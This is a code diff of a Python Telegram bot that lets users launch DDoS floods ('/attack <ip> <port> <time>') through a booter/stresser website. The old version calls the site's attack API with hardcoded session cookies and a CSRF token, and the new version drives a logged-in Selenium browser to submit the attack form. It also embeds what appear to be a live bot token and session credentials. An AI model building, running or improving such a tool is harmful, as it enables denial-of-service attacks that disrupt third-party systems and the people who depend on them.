@@ -1,75 +1,105 @@
-import requests
+import os
 import json
+import logging
+import threading
 import time
-from telegram import Update
-from telegram.ext import Application, CommandHandler, ContextTypes
+from datetime import datetime
+from telegram import Update, KeyboardButton, ReplyKeyboardMarkup, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters, CallbackQueryHandler
+from selenium import webdriver
+from selenium.webdriver.common.by import By
+from selenium.webdriver.support.ui import WebDriverWait
+from selenium.webdriver.support import expected_conditions as EC
+from selenium.webdriver.chrome.service import Service
+from webdriver_manager.chrome import ChromeDriverManager
+import asyncio
 
 # ==================== CONFIG ====================
+logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
+logger = logging.getLogger(__name__)
+
 BOT_TOKEN = "8521144614:AAE-P7L4SKCMk5ZaggzU4jZmhmbMMBUhUJA"
-ADMIN_IDS = [7820814565]  # Apna ID
+ADMIN_IDS = [7820814565]  # Sirf admin ID
 
-# API Details
-BASE_URL = "https://satellitestress.st"
-API_LOGIN = f"{BASE_URL}/api/csrf"
-API_ATTACK = f"{BASE_URL}/api/attack/launch"
+# Website details
+WEBSITE_URL = "https://satellitestress.st/attack"
+LOGIN_URL = "https://satellitestress.st/login"
 
-# Tumhari capture ki hui cookies aur CSRF token (UPDATE KAR DIYA)
-CSRF_TOKEN = "45aa3281026e28fd110acfef4383e5638134b72e3e1bc695cf2a8d0f9a343926.1772721528.NmJ0cM4C8ltE8iviPU_wsFlw1otzsPlPDfSpSOczkKU"
-COOKIES = {
-    "__diamwall": "0x1110792600",
-    "satellite_auth": "971c225b-8d48-4788-be56-2e5295bda170",
-    "satellite_captcha_verified": "HC2.eyJ2IjoxLCJ1aWQiOiJiNjU2OWVjOGVjZjFkM2ZhIiwiaWF0IjoxNzcyNzIwNjgzODM0LCJleHAiOjE3NzI4MDcwODM4MzQsIm5vbmNlIjoiMjg3YTJhYmRlM2RhY2ViYyJ9.NR8z3ft6xCVc3z6ySecuSqea6PBVeEDBvErNTirtyns"
-}
+# ==================== GLOBAL BROWSER (Admin login karega) ====================
+driver = None
+browser_ready = False
+browser_lock = threading.Lock()
 
-# Session create karo
-session = requests.Session()
-session.cookies.update(COOKIES)
-session.headers.update({
-    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:147.0) Gecko/20100101 Firefox/147.0",
-    "Accept": "*/*",
-    "Accept-Language": "en-US,en;q=0.9",
-    "Content-Type": "application/json",
-    "Origin": BASE_URL,
-    "Referer": f"{BASE_URL}/attack",
-    "x-csrf-token": CSRF_TOKEN,
-    "TE": "trailers"
-})
-
-# ==================== ATTACK FUNCTION ====================
-def launch_api_attack(ip, port, duration):
-    """Direct API attack - fastest method"""
-    
-    # Payload (Content-Length: 88 ke hisaab se)
-    payload = {
-        "target": ip,
-        "port": int(port),
-        "time": int(duration),
-        "method": "UDP-FREE"
-    }
-    
+def init_browser():
+    """Browser initialize karo aur login page kholo"""
+    global driver, browser_ready
     try:
-        response = session.post(API_ATTACK, json=payload, timeout=30)
-        
-        if response.status_code == 200:
-            result = response.json()
-            return True, result.get('message', 'Attack launched successfully')
-        else:
-            return False, f"HTTP {response.status_code}: {response.text[:200]}"
-            
+        options = webdriver.ChromeOptions()
+        options.add_argument('--no-sandbox')
+        options.add_argument('--disable-dev-shm-usage')
+        # Headless mode nahi rakhte taaki admin login dekh sake
+        service = Service(ChromeDriverManager().install())
+        driver = webdriver.Chrome(service=service, options=options)
+        driver.get(LOGIN_URL)
+        print("="*50)
+        print("🔐 Browser opened. Please login manually in the browser window.")
+        print("After login, type /ready in bot to continue.")
+        print("="*50)
+        browser_ready = False  # Jab tak admin /ready na kare
     except Exception as e:
-        return False, str(e)
+        print(f"❌ Browser init error: {e}")
+        browser_ready = False
+
+# Thread mein browser start karo
+threading.Thread(target=init_browser, daemon=True).start()
 
 # ==================== TELEGRAM COMMANDS ====================
-async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle /attack command"""
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
+    if user_id not in ADMIN_IDS:
+        await update.message.reply_text("⛔ You are not authorized to use this bot.")
+        return
+    
+    await update.message.reply_text(
+        "🤖 **Admin Bot Started**\n\n"
+        "1. Browser automatically opened.\n"
+        "2. Login to the website manually.\n"
+        "3. After login, type /ready\n\n"
+        "Users can then use /attack command."
+    )
+
+async def ready(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Admin ne login kar liya - ab browser ready hai"""
+    global browser_ready
+    user_id = update.effective_user.id
+    if user_id not in ADMIN_IDS:
+        return
+    
+    if driver is None:
+        await update.message.reply_text("❌ Browser not initialized. Restart bot.")
+        return
+    
+    browser_ready = True
+    await update.message.reply_text(
+        "✅ **Browser is ready!**\n\n"
+        "Users can now use:\n"
+        "`/attack <ip> <port> <time>`\n"
+        "Example: `/attack 1.1.1.1 80 60`"
+    )
+
+async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """User attack command - browser reuse karega"""
+    global driver, browser_ready
+    
+    if not browser_ready or driver is None:
+        await update.message.reply_text("⏳ Bot is not ready yet. Admin is setting up...")
+        return
     
     # Parse arguments
     args = context.args
     if len(args) != 3:
         await update.message.reply_text(
-            "❌ **Invalid format!**\n"
-            "Use: `/attack <ip> <port> <time>`\n"
+            "❌ Use: `/attack <ip> <port> <time>`\n"
             "Example: `/attack 1.1.1.1 80 60`"
         )
         return
@@ -80,17 +110,17 @@ async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
         port = int(port_str)
         if port < 1 or port > 65535:
-            await update.message.reply_text("❌ Port must be between 1-65535")
+            await update.message.reply_text("❌ Port must be 1-65535")
             return
     except:
-        await update.message.reply_text("❌ Invalid port number")
+        await update.message.reply_text("❌ Invalid port")
         return
     
     # Validate time
     try:
         duration = int(time_str)
         if duration < 10 or duration > 300:
-            await update.message.reply_text("❌ Time must be between 10-300 seconds")
+            await update.message.reply_text("❌ Time must be 10-300 seconds")
             return
     except:
         await update.message.reply_text("❌ Invalid time")
@@ -98,70 +128,106 @@ async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     # Send initial message
     msg = await update.message.reply_text(
-        f"🔄 **Launching API attack...**\n"
+        f"🔄 **Launching attack...**\n"
         f"Target: `{ip}:{port}`\n"
         f"Duration: {duration}s"
     )
     
-    # Launch attack
-    success, result = launch_api_attack(ip, port, duration)
+    # Browser mein attack karo (alag thread mein taaki bot block na ho)
+    def attack_thread():
+        with browser_lock:
+            try:
+                # Current tab mein attack page open karo
+                driver.get(WEBSITE_URL)
+                wait = WebDriverWait(driver, 10)
+                
+                # Saare input fields dhundho
+                inputs = wait.until(EC.presence_of_all_elements_located((By.TAG_NAME, "input")))
+                
+                # Filter visible inputs
+                visible = []
+                for inp in inputs:
+                    if inp.is_displayed() and inp.get_attribute('type') != 'hidden':
+                        visible.append(inp)
+                
+                if len(visible) >= 3:
+                    # IP field
+                    visible[0].clear()
+                    visible[0].send_keys(ip)
+                    
+                    # Port field
+                    visible[1].clear()
+                    visible[1].send_keys(str(port))
+                    
+                    # Time field
+                    visible[2].clear()
+                    visible[2].send_keys(str(duration))
+                    
+                    # Launch button dhundho
+                    buttons = driver.find_elements(By.TAG_NAME, "button")
+                    launch_btn = None
+                    for btn in buttons:
+                        if "Launch" in btn.text:
+                            launch_btn = btn
+                            break
+                    
+                    if launch_btn:
+                        launch_btn.click()
+                        time.sleep(2)
+                        
+                        # Send success message
+                        async def send_success():
+                            await context.bot.send_message(
+                                chat_id=update.effective_chat.id,
+                                text=f"✅ **Attack launched!**\n\n`{ip}:{port}` for {duration}s"
+                            )
+                        asyncio.run_coroutine_threadsafe(send_success(), asyncio.get_event_loop())
+                    else:
+                        async def send_error():
+                            await context.bot.send_message(
+                                chat_id=update.effective_chat.id,
+                                text="❌ Launch button not found"
+                            )
+                        asyncio.run_coroutine_threadsafe(send_error(), asyncio.get_event_loop())
+                else:
+                    async def send_error():
+                        await context.bot.send_message(
+                            chat_id=update.effective_chat.id,
+                            text=f"❌ Only {len(visible)} inputs found"
+                        )
+                    asyncio.run_coroutine_threadsafe(send_error(), asyncio.get_event_loop())
+                    
+            except Exception as e:
+                async def send_error():
+                    await context.bot.send_message(
+                        chat_id=update.effective_chat.id,
+                        text=f"❌ Attack error: {str(e)}"
+                    )
+                asyncio.run_coroutine_threadsafe(send_error(), asyncio.get_event_loop())
     
-    if success:
-        await msg.edit_text(
-            f"✅ **ATTACK LAUNCHED SUCCESSFULLY!**\n\n"
-            f"Target: `{ip}:{port}`\n"
-            f"Duration: {duration}s\n"
-            f"Method: UDP-FREE\n\n"
-            f"⚡ Attack is now running!"
-        )
-    else:
-        await msg.edit_text(
-            f"❌ **ATTACK FAILED**\n\n"
-            f"Error: {result}\n\n"
-            f"Cookies ya CSRF token expire ho sakta hai."
-        )
-
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Start command"""
-    await update.message.reply_text(
-        "🤖 **API ATTACK BOT**\n\n"
-        "Commands:\n"
-        "• `/attack <ip> <port> <time>` - Launch attack\n"
-        "  Example: `/attack 1.1.1.1 80 60`\n\n"
-        "⚡ Fastest method - direct API calls!"
-    )
+    threading.Thread(target=attack_thread).start()
 
 async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Check API status"""
-    try:
-        # CSRF endpoint se check karo
-        resp = session.get(API_LOGIN)
-        if resp.status_code == 200:
-            await update.message.reply_text("✅ API is working! Cookies are valid.")
-        else:
-            await update.message.reply_text(f"❌ API error: {resp.status_code}")
-    except Exception as e:
-        await update.message.reply_text(f"❌ Connection error: {str(e)}")
+    """Check browser status"""
+    if browser_ready:
+        await update.message.reply_text("✅ Browser is ready. Attack can be launched.")
+    else:
+        await update.message.reply_text("⏳ Browser is not ready yet. Admin is logging in.")
 
 # ==================== MAIN ====================
 def main():
     app = Application.builder().token(BOT_TOKEN).build()
     
     app.add_handler(CommandHandler("start", start))
+    app.add_handler(CommandHandler("ready", ready))
     app.add_handler(CommandHandler("attack", attack))
     app.add_handler(CommandHandler("status", status))
     
     print("="*50)
-    print("🔥 API ATTACK BOT STARTED")
+    print("🤖 SELENIUM BOT STARTED")
     print("="*50)
-    print(f"🌐 Base URL: {BASE_URL}")
-    print(f"🎯 Attack endpoint: {API_ATTACK}")
-    print(f"🍪 Cookies loaded: {len(COOKIES)}")
-    print(f"🔑 CSRF Token: {CSRF_TOKEN[:30]}...")
-    print("="*50)
-    print("Commands:")
-    print("  /attack ip port time")
-    print("  /status")
+    print("👑 Admin only: /start, /ready")
+    print("👥 Users: /attack ip port time")
     print("="*50)
     
     app.run_polling()
